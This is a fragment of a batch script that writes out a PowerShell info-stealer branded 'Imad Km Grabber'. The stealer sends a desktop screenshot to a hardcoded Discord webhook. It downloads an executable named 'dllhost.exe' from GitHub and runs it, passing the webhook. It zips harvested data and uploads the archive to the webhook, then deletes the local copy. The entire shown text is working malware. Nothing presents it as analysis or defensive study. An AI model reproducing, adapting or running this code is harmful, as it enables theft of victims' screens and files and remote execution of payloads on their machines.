...
echo $webhook = "https://discord.com/api/webhooks/1421825704789540925/n2oh5dzQEJPiWulp7v7fTm_Cn7CwLvacY93Pu35unVq8loptP2qusD6RKohyGyyMreOH" >> powershell123.ps1
...
echo "username" = "IMAD_KM" >> powershell123.ps1
echo "content" = "@everyone" >> powershell123.ps1
echo "title" = "IMAD_KM" >> powershell123.ps1
echo "description" = "Imad Km Grabber" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "avatar_url" = "https://cdn.discordapp.com/attachments/1102602531705729024/1102727097522335795/211_9D93764.png" >> powershell123.ps1
echo "url" = "https://discord.gg/vk3rBhcj2y" >> powershell123.ps1
echo "embeds" = @( >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "title" = "IMAD KM GRABBER" >> powershell123.ps1
echo "url" = "https://discord.gg/RJfagD3qqM" >> powershell123.ps1
echo "description" = "yedek fih" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "footer" = @{ >> powershell123.ps1
echo "text" = "Made by Imad Km And csp ff" >> powershell123.ps1
echo } >> powershell123.ps1
echo "thumbnail" = @{ >> powershell123.ps1
echo "url" = "https://cdn.discordapp.com/attachments/1102602531705729024/1102727097522335795/211_9D93764.png" >> powershell123.ps1
echo } >> powershell123.ps1
...
echo curl.exe -F "payload_json={\`"username\`": \`"IMAD KM SCREEN\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook ^| out-null >> powershell123.ps1
...
echo } >> powershell123.ps1
echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/editx77/afafda/raw/refs/heads/main/dllhost.exe" -OutFile "dllhost.exe" -UseBasicParsing >> powershell123.ps1
echo $proc = Start-Process $env:LOCALAPPDATA\Temp\dllhost.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell123.ps1
...
echo Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\Imad_Km.zip" -Force >> powershell123.ps1
echo curl.exe -X POST -F 'payload_json={\"username\": \"IMAD KM GRABBER\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/attachments/1102602531705729024/1102727097522335795/211_9D93764.png\"}' -F "file=@$extracted\Imad_Km.zip" $webhook >> powershell123.ps1
echo Remove-Item "$extracted\Imad_Km.zip" >> powershell123.ps1
